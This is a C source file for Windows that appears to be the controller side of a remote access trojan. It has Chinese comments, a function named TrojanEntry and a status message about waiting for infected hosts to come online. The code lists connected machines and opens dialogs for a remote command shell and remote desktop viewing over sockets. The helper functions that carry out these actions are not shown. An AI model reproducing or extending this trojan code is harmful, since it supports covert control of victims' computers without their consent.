#pragma once
#include "MainFunc.h"

#define WM_SOCKET	0x0401
SOCKET sockfd;
char szSendCmd[MAXLENGTH] = {0};
char szRecvCmd[MAXLENGTH] = {0};
int  dwSendSize = 0;
int  dwRecvSize = 0;
HINSTANCE hInst = NULL;
char szFname[MAX_PATH] = {0};
int	dwSelected = 0;

//主函数
int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd ){
	hInst = hInstance;
	InitCommonControls();//初始化通用控件库
	TrojanEntry();//主窗口过程
	return DialogBox(hInstance,MAKEINTRESOURCE(IDD_DIALOG),NULL,(DLGPROC)MainDlgProc);
}

//////////////////////////////////////////////////////////////////////////
//主窗口过程
LRESULT CALLBACK MainDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam ){
	hDlgMain = hDlg;
	HINSTANCE hInstance = GetModuleHandle(NULL);
	HWND hListControl = GetDlgItem(hDlg,IDC_LIST1);
	char msg[1024] = {0};

	switch (uMsg){
	case WM_INITDIALOG:{
			InitListControl(hListControl);
			hSBarDlg = CreateStatusWindow(WS_CHILD|WS_VISIBLE|SBARS_SIZEGRIP,NULL,hDlg,ID_STATUSBAR);
			memcpy(msg,"开始监听主机上线...",sizeof(msg));
			SendMessage(hSBarDlg,SB_SETTEXT,NULL,(LPARAM)msg);
		}
		break;
	case WM_COMMAND:{
			char temp[1024] = {0}; 
			int count = ListView_GetSelectionMark(hListControl);
			dwSelected = count;
			ListView_GetItemText(hListControl,count,4,temp,1024);
			SOCKET s = (SOCKET)atoi(temp);
			switch (LOWORD(wParam)){
			
			case IDC_BUTTON3:
				DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG2),hDlg,(DLGPROC)CmdDlgProc,(LPARAM)s);
				break;
			case IDC_BUTTON6:
				DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG5),hDlg,(DLGPROC)DesktopDlgProc,(LPARAM)s);
				break;
			}
		}
		break;
	case WM_CLOSE: EndDialog(hDlg,NULL);
		break;
	default:
		break;
	}
	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//远程CMD窗口过程
LRESULT CALLBACK CmdDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam){
	switch (uMsg){
	case WM_COMMAND:{
			switch(LOWORD(wParam)){
			case IDC_BUTTON1:
				CmdRequest(sockfd,hDlg);//发送远程CMD命令要求
				break;
			}
		}
		break;
	case WM_SOCKET:{
			switch(LOWORD(lParam)){
			case FD_WRITE:
				SendCmd(sockfd,NULL,NULL);//继续发送
				break;
			case FD_READ:
				RecvCmd(sockfd);
				break;
			case FD_CLOSE:
				SocketError(sockfd);
				//EndDialog(hDlg,NULL);
				break;
			}
		}
		break;
	case WM_INITDIALOG:{
			sockfd = (SOCKET)lParam;
			WSAAsyncSelect(sockfd,hDlg,WM_SOCKET,FD_WRITE|FD_READ|FD_CLOSE);//非拥塞模式
		}
		break;
	case WM_CLOSE:
		EndDialog(hDlg,NULL);
		break;
	default:
		break;
	}
	return FALSE;
}
//////////////////////////////////////////////////////////////////////////
//远程桌面窗口过程
LRESULT CALLBACK DesktopDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam){
	switch (uMsg){
	case WM_COMMAND:{
			switch (LOWORD(wParam)){
			case IDC_BUTTON1:
				DeskViewRequest(sockfd,hDlg);
				break;
			}
		}
		break;
	case WM_INITDIALOG:
		sockfd = (SOCKET)lParam;
		break;
	case WM_CLOSE:
		EndDialog(hDlg,NULL);
		break;
	default:
		break;
	}
	return FALSE;
}